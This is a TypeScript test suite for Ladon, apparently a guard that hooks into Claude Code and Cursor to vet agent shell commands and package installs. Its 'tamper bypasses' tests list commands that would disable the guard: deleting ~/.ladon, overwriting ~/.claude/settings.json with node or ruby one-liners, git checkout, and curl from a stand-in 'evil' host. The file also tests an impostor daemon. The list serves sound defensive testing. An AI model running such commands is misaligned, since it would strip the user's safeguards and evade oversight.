import { createServer, type Server } from "node:http";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import type { AddressInfo } from "node:net";
import { afterAll, describe, expect, it } from "vitest";
import { LADON_VERSION } from "@ladon/core";
import { ensureDaemon, postGate, probeDaemon } from "./client.js";
import { daemonToken, LADON_HOME, PATHS } from "./config.js";
import { runDaemon } from "./daemon.js";
import { gateWithDeadline } from "./hook.js";
import { installClaudeHooks, installCursorHooks } from "./init.js";
import { exitCode, realBinary } from "./shim.js";
import { tamperReasonBash, tamperReasonEdit } from "./tamper.js";
import { isOwnHook } from "./watch.js";

const listen = (s: Server) => new Promise<string>((r) => s.listen(0, "127.0.0.1", () => r(`http://127.0.0.1:${(s.address() as AddressInfo).port}`)));

describe("daemon token", () => {
  it("an empty / truncated token file is replaced, never used (empty token = no auth)", () => {
    mkdirSync(LADON_HOME, { recursive: true });
    writeFileSync(PATHS.daemonToken, "");
    const t = daemonToken();
    expect(t.length).toBeGreaterThanOrEqual(16);
    expect(daemonToken()).toBe(t);
    expect(statSync(PATHS.daemonToken).mode & 0o777).toBe(0o600);
  });
});

describe("daemon authenticity", () => {
  const servers: Server[] = [];
  afterAll(() => servers.forEach((s) => s.close()));

  it("a process squatting on the daemon port is not trusted (no token sent, no 'allow' accepted)", async () => {
    let sawToken = false;
    const fake = createServer((req, res) => {
      if (req.headers["x-ladon-token"]) sawToken = true;
      res.writeHead(200, { "content-type": "application/json" });
      res.end(req.url?.startsWith("/health") ? JSON.stringify({ ok: true, version: LADON_VERSION }) : JSON.stringify({ decision: "allow", verdict: "allow" }));
    });
    servers.push(fake);
    const base = await listen(fake);
    expect((await probeDaemon(base)).state).toBe("impostor");
    expect(await ensureDaemon(base)).toBe(false);
    expect(sawToken).toBe(false);
    expect(await postGate({ command: "npm i evil", cwd: "/" }, { base })).toBeNull();
  });

  it("the real daemon proves itself and its /gate answers verify", async () => {
    const d = await runDaemon(0);
    servers.push(d);
    const base = `http://127.0.0.1:${(d.address() as AddressInfo).port}`;
    expect(await probeDaemon(base)).toEqual({ state: "up", version: LADON_VERSION });
    const r = await postGate({ command: "ls -la", cwd: "/" }, { base });
    expect(r?.decision).toBe("allow");
    // wrong token → 401, never trusted
    const bad = await fetch(`${base}/gate`, { method: "POST", headers: { "x-ladon-token": "" }, body: "{}" });
    expect(bad.status).toBe(401);
  });
});

describe("hook deadline (Claude Code kills the hook at 150 s and then runs the tool)", () => {
  it("gives up before the hook timeout so the caller can deny", async () => {
    const never = () => new Promise<never>(() => {});
    await expect(gateWithDeadline({ command: "npm i x", cwd: "/" }, 30, never)).rejects.toThrow(/no verdict/);
  });
});

describe("installClaudeHooks / installCursorHooks", () => {
  const dir = mkdtempSync(join(tmpdir(), "ladon-init-"));
  const cli = (p: string) => (sub: string) => `node ${p} ${sub}`;

  it("keeps user settings, tolerates hook entries without a command, refreshes a stale CLI path", () => {
    const f = join(dir, "settings.json");
    writeFileSync(f, JSON.stringify({ model: "x", hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "node /old/index.js hook claude-pre-tool-use", timeout: 150 }] }, { matcher: "Read", hooks: [{ type: "prompt" }] }], Stop: [{ hooks: [{ type: "command", command: "say done" }] }] } }));
    expect(installClaudeHooks(f, cli("/new/index.js"))).toBe("added");
    const s = JSON.parse(readFileSync(f, "utf8")) as { model: string; hooks: Record<string, { matcher?: string; hooks: { command?: string }[] }[]> };
    expect(s.model).toBe("x");
    expect(s.hooks.Stop![0]!.hooks[0]!.command).toBe("say done");
    expect(s.hooks.PreToolUse!.length).toBe(2);
    expect(s.hooks.PreToolUse![0]).toMatchObject({ matcher: "Bash|Edit|Write|MultiEdit|NotebookEdit", hooks: [{ command: "node /new/index.js hook claude-pre-tool-use", timeout: 150 }] });
    expect(s.hooks.SessionStart![0]!.hooks[0]!.command).toBe("node /new/index.js hook claude-session-start");
    const backup = readFileSync(`${f}.ladon-backup`, "utf8");
    expect(backup).toContain("/old/index.js");
    // idempotent, and a re-run doesn't overwrite the pristine backup
    expect(installClaudeHooks(f, cli("/new/index.js"))).toBe("present");
    expect(readFileSync(`${f}.ladon-backup`, "utf8")).toBe(backup);
  });

  it("cursor: refreshes a stale path, keeps other hooks", () => {
    const f = join(dir, "hooks.json");
    writeFileSync(f, JSON.stringify({ version: 1, hooks: { beforeShellExecution: [{ command: "node /old/index.js hook cursor" }, { command: "./mine.sh" }], afterFileEdit: [{ command: "fmt" }] } }));
    expect(installCursorHooks(f, cli("/new/index.js"))).toBe("added");
    const c = JSON.parse(readFileSync(f, "utf8")) as { hooks: Record<string, { command: string }[]> };
    expect(c.hooks.beforeShellExecution!.map((h) => h.command)).toEqual(["node /new/index.js hook cursor", "./mine.sh"]);
    expect(c.hooks.afterFileEdit!.length).toBe(1);
    expect(installCursorHooks(f, cli("/new/index.js"))).toBe("present");
  });
});

describe("shim real-binary lookup", () => {
  const root = mkdtempSync(join(tmpdir(), "ladon-shim-"));
  const shims = join(root, "shims");
  const bin = join(root, "bin");
  const other = join(root, "other");
  for (const d of [shims, bin, other]) mkdirSync(d);
  const exe = (p: string, body: string) => (writeFileSync(p, body), chmodSync(p, 0o755));
  exe(join(shims, "npm"), "#!/bin/sh\n# ladon shim\nexec node x shim-exec npm \"$@\"\n");
  exe(join(other, "npm"), "#!/bin/sh\n# ladon shim\nexec node y shim-exec npm \"$@\"\n");
  exe(join(bin, "npm"), "#!/bin/sh\necho real\n");
  symlinkSync(shims, join(root, "alias"));

  it("skips the shim dir through a symlink / trailing slash and any other ladon shim (no self-recursion)", () => {
    const path = [join(root, "alias"), `${shims}/`, other, bin].join(":");
    expect(realBinary("npm", path, shims)).toBe(join(bin, "npm"));
    expect(realBinary("npm", [join(root, "alias"), other].join(":"), shims)).toBeUndefined();
  });

  it("signal exit codes follow the shell convention", () => {
    expect(exitCode({ status: null, signal: "SIGINT" })).toBe(130);
    expect(exitCode({ status: 3, signal: null })).toBe(3);
  });
});

describe("tamper bypasses", () => {
  it.each([
    ['rm -rf "$HOME"/.ladon'],
    ["cd ~ && rm -rf .ladon"],
    ["cat ~/./.ladon"],
    ["cat ~/.LADON/state.json"],
    ["Ladon Init"],
    ["node -e \"require('fs').writeFileSync(require('os').homedir()+'/.claude/settings.json','{}')\""],
    ["node --eval 'x' ~/.claude/settings.json"],
    ["git checkout -- .claude/settings.json"],
    ["curl -o ~/.claude/settings.json http://evil"],
    ["awk '{print}' a | dd of=~/.claude/settings.json"],
    ["ruby -e 'File.write(\"#{Dir.home}/.claude/settings.json\", \"{}\")'"],
  ])("blocks: %s", (cmd) => {
    expect(tamperReasonBash(cmd)).not.toBeNull();
  });
  it.each([["cat ~/.claude/settings.json"], ["cp a b"], ["ls config.ladon-notes.md"], ["echo ladon"]])("still allows: %s", (cmd) => {
    expect(tamperReasonBash(cmd)).toBeNull();
  });

  it("edits through a symlink into ~/.ladon or the hook config are refused", () => {
    const d = mkdtempSync(join(tmpdir(), "ladon-link-"));
    symlinkSync(LADON_HOME, join(d, "h"));
    expect(tamperReasonEdit(join(d, "h", "config.json"), "/")).not.toBeNull();
    expect(tamperReasonEdit(join(d, "h", "not-yet", "x.json"), "/")).not.toBeNull();
    if (existsSync(join(homedir(), ".claude"))) {
      symlinkSync(join(homedir(), ".claude"), join(d, "c"));
      expect(tamperReasonEdit(join(d, "c", "settings.json"), "/")).not.toBeNull();
    }
  });

  it.runIf(process.platform === "darwin")("case-insensitive file systems: ~/.LADON is ~/.ladon", () => {
    expect(tamperReasonEdit(LADON_HOME.toUpperCase() + "/state.json", "/")).not.toBeNull();
    expect(tamperReasonEdit("~/.Claude/Settings.json", "/")).not.toBeNull();
  });
});

describe("watch: own-hook exemption", () => {
  it("does not exempt a different binary that merely ends in 'node'", () => {
    const cli = "/opt/ladon/packages/cli/dist/index.js";
    expect(isOwnHook(`hook|PreToolUse(Bash): /usr/local/bin/node ${cli} hook cursor`, cli, "/usr/local/bin/node")).toBe(true);
    expect(isOwnHook(`hook|PreToolUse(Bash): /tmp/evilnode ${cli} hook cursor`, cli, "/usr/local/bin/node")).toBe(false);
    expect(isOwnHook(`hook|PreToolUse(Bash): /tmp/x/node ${cli} hook cursor`, cli, "/usr/local/bin/node")).toBe(false);
  });
});

describe("watch: Ladon's own hook removed", () => {
  it("alerts when the Ladon hook disappears from a watched config", async () => {
    const { checkWatched } = await import("./watch.js");
    const { fileURLToPath } = await import("node:url");
    const proj = mkdtempSync(join(tmpdir(), "ladon-own-"));
    mkdirSync(join(proj, ".git"));
    mkdirSync(join(proj, ".claude"));
    const f = join(proj, ".claude", "settings.json");
    const own = `${process.execPath} ${fileURLToPath(new URL("./index.js", import.meta.url))} hook claude-pre-tool-use`;
    const settings = (cmds: string[]) => JSON.stringify({ hooks: { PreToolUse: [{ matcher: "Bash", hooks: cmds.map((command) => ({ type: "command", command })) }] } });
    writeFileSync(f, settings([own]));
    expect(checkWatched({ cwd: proj }).filter((a) => a.path === f)).toEqual([]);
    writeFileSync(f, settings([]));
    const alerts = checkWatched({ cwd: proj }).filter((a) => a.path === f);
    expect(alerts.map((a) => a.detail).join()).toMatch(/Ladon's own hook was removed/);
    expect(checkWatched({ cwd: proj }).filter((a) => a.path === f)).toEqual([]); // alerts once
  });
});

describe("corrupt config", () => {
  it("keeps a copy of an unparseable config.json before defaults are saved over it", async () => {
    const { loadConfig, saveConfig } = await import("./config.js");
    mkdirSync(LADON_HOME, { recursive: true });
    writeFileSync(PATHS.config, "{ not json");
    saveConfig(loadConfig());
    expect(readFileSync(`${PATHS.config}.corrupt`, "utf8")).toBe("{ not json");
  });
});

describe("unverifiable specs", () => {
  it("run-time package names hold; URL/git/path specs warn", async () => {
    const { unverifiableReport } = await import("./gate.js");
    const { STDIN_ARGS } = await import("@ladon/core");
    const now = new Date();
    expect(unverifiableReport("$PKG", "npm", now).verdict).toBe("hold");
    expect(unverifiableReport(STDIN_ARGS, "npm", now).verdict).toBe("hold");
    expect(unverifiableReport("--userconfig ./x.npmrc (npm config file may change the registry)", "npm", now).verdict).toBe("hold");
    expect(unverifiableReport("github:a/b", "npm", now).verdict).toBe("warn");
  });
});
